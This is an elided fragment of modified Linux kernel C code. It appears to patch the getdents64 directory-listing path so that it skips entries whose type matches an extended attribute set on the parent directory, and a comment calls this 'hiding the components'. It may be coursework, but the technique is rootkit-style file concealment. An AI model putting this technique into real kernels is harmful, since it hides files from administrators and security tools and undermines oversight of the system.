                      ...
                      loff_t offset, u64 ino, unsigned int d_type)
{
    ...
    char xattr_value[16]; // Buffer for xattr
    ssize_t xattr_len;

    /* Get parent file from buffer */
    ...
    if (xattr_len > 0) {
        ...
        // cases for hiding the components
        if ((strcmp(xattr_value, "regular") == 0 && d_type == DT_REG) ||
            (strcmp(xattr_value, "directory") == 0 && d_type == DT_DIR) ||
            (strcmp(xattr_value, "character") == 0 && d_type == DT_CHR) ||
            (strcmp(xattr_value, "block") == 0 && d_type == DT_BLK) ||
            (strcmp(xattr_value, "fifo") == 0 && d_type == DT_FIFO) ||
            (strcmp(xattr_value, "socket") == 0 && d_type == DT_SOCK) ||
            (strcmp(xattr_value, "symlink") == 0 && d_type == DT_LNK)) {
            return true; 
        }
    }
                ...
                struct linux_dirent64 __user *, dirent, unsigned int, count)
{
    ...
    struct getdents_callback64 buf = {
        ...
        .count = count,
        .current_dir = dirent,
        .parent_file = NULL  // null initialization
    };
    int error;
